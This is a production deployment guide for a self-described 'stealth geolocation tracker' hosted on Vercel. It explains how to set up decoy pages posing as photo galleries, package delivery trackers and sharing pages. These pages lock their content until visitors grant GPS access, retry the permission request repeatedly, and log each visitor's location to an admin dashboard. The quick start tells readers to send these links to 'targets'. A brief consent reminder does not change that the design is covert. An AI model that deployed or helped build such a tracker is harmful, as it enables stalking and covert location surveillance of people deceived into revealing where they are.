# 🚀 Production Deployment Guide

This guide covers deploying your stealth geolocation tracker to production on Vercel.

## ⚠️ Pre-Deployment Checklist

- [ ] **Admin credentials** - Set custom `ADMIN_USERNAME` and `ADMIN_PASSWORD` environment variables
- [ ] **HTTPS only** - Geolocation API requires HTTPS (Vercel provides this automatically)
- [ ] **Environment variables** - Configure all required variables in Vercel dashboard
- [ ] **Test locally** - Ensure all features work before deploying
- [ ] **Privacy compliance** - Review your use case for legal compliance

## 📋 Environment Variables Required

These MUST be set in your Vercel dashboard:

```env
# Required for production
ADMIN_USERNAME=your-secure-username-here
ADMIN_PASSWORD=your-very-secure-password-here
NODE_ENV=production

# Optional but recommended
PORT=3000
```

## 🌐 Vercel Deployment Steps

### 1. Push to GitHub
```bash
git add .
git commit -m "Production-ready deployment"
git push origin main
```

### 2. Import to Vercel

1. Go to [vercel.com](https://vercel.com)
2. Click "Import Project"
3. Select your GitHub repository
4. Configure:
   - Framework Preset: `Other`
   - Root Directory: `./` (leave default)
   - Build Command: (leave empty)
   - Output Directory: `public`

### 3. Set Environment Variables

In Vercel dashboard → Settings → Environment Variables:

1. Add `ADMIN_USERNAME` with a secure username
2. Add `ADMIN_PASSWORD` with a strong password
3. Add `NODE_ENV` set to `production`

⚠️ **CRITICAL**: Never use default admin/admin123 in production!

### 4. Deploy

Click "Deploy" and wait for the build to complete.

## 🔗 Available Routes

Your app will be available at: `https://your-app.vercel.app`

### Public Tracking Pages (Stealth)
- `/` → Redirects to `/photos`
- `/photos` → Photo Gallery (primary stealth page)
- `/delivery` → Package Delivery Tracker
- `/share` → Content Sharing Page
- `/view` → Generic Viewer
- `/album` → Photo Album
- `/content` → Content Display

### Admin Routes
- `/admin` → Admin Dashboard (login required)
- `/editor` → Content Editor (accessed from admin)

### API Endpoints
- `POST /api/track` → Tracking data submission
- `POST /api/admin/login` → Admin authentication
- `GET /api/admin/tracks` → View tracked data
- `GET /api/admin/export` → Export all data
- `GET/POST /api/admin/config` → Page configurations

## 🔒 Security Considerations

### 1. Admin Access
- Admin URL: `https://your-app.vercel.app/admin`
- Login with your configured credentials
- Dashboard shows all tracked locations and data

### 2. Tracking URLs
Send these URLs to track locations:
- `https://your-app.vercel.app/photos`
- `https://your-app.vercel.app/delivery`
- etc.

### 3. Data Storage
- Currently uses JSON file storage (`tracking-data.json`)
- For production, consider MongoDB or PostgreSQL
- Data persists between deployments on Vercel

### 4. Rate Limiting
- 100 requests per 15 minutes per IP
- 10 location submissions per 5 minutes per IP
- Adjust in `server.js` if needed

## 🎨 Customizing Content

1. Login to admin dashboard
2. Click "🎨 Edit Content"
3. Customize each page:
   - Title and subtitle
   - Content type (photos, delivery, etc.)
   - Custom HTML/embeds
   - Images and text

## 📊 Monitoring

### View Tracked Data
1. Go to `/admin`
2. Login with your credentials
3. View:
   - Total tracks count
   - GPS vs IP-only submissions
   - Detailed location data
   - Export options

### Server Logs
In Vercel dashboard → Functions → View logs

## 🚨 Troubleshooting

### "Admin credentials not set" error
- Set `ADMIN_USERNAME` and `ADMIN_PASSWORD` in Vercel environment variables

### GPS permission denied by users
- Content is locked until they allow location
- Auto-retry mechanism attempts every 15 seconds
- Clear instructions provided to users

### Tracking not working
- Ensure HTTPS is enabled (automatic on Vercel)
- Check browser console for errors
- Verify rate limits aren't exceeded

### Custom domain setup
1. In Vercel → Settings → Domains
2. Add your domain (e.g., `track.yourdomain.com`)
3. Configure DNS as instructed

## 🔄 Updates and Maintenance

### Deploying Updates
```bash
git add .
git commit -m "Update description"
git push origin main
```

Vercel automatically deploys on push to main branch.

### Backing Up Data
1. Login to admin dashboard
2. Click "Export All Data"
3. Save the JSON file securely

### Clearing Old Data
Currently manual - delete entries from `tracking-data.json`
Future enhancement: Add data retention policies

## 📱 Mobile Considerations

- All pages are mobile-responsive
- GPS accuracy typically better on mobile
- Some browsers may have stricter permissions
- Test on both iOS and Android

## 🌍 Performance

- Static assets cached for 1 hour
- Server functions timeout at 10 seconds
- Deployed to `iad1` region (US East)
- Change region in `vercel.json` if needed

## ⚖️ Legal Reminder

- Only track with explicit consent
- Follow GDPR/CCPA regulations
- Implement data deletion on request
- Keep data secure and encrypted
- Regular security audits recommended

---

## 🎯 Quick Start Summary

1. **Set environment variables** in Vercel dashboard
2. **Deploy from GitHub** repository  
3. **Access admin** at `/admin` with your credentials
4. **Send tracking links** like `/photos` to targets
5. **Monitor results** in the admin dashboard

Need help? Check server logs in Vercel dashboard or review the error messages.
